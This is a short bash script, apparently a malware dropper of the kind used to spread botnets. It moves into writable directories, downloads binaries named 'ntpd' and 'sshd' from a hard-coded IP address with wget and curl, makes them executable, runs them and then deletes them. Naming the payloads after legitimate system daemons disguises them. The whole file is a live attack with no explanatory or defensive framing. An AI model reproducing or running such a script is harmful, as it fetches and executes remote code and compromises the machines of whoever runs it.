#!/bin/bash
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://165.227.106.171/ntpd; curl -O http://165.227.106.171/ntpd; chmod +x ntpd; ./ntpd; rm -rf ntpd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://165.227.106.171/sshd; curl -O http://165.227.106.171/sshd; chmod +x sshd; ./sshd; rm -rf sshd
